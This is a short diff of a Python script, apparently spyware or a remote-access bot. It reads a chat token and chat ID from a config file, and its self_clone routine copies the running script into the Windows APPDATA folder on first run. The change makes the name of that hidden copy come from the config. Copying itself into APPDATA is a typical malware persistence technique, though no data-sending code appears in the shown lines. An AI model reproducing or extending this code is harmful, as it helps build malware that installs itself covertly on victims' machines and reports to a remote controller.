@@ -45,6 +45,7 @@ for line in inidata.split("\n"):
 
 token=config["main"]["token"]
 chatid =config["main"]["chatid"]
+program =config["main"]["program"]
 interval = int(config["main"]["interval"])
 
 caption = "amogus"
@@ -86,7 +87,6 @@ def self_clone(name):
     import shutil
     shutil.copyfile(sys.argv[0], name)
 
-program = os.path.basename(sys.argv[0])
 if not os.path.exists(os.environ["APPDATA"]+"/"+program):
     self_clone(os.environ["APPDATA"]+"/"+program)
     if "first_setup" in dir():
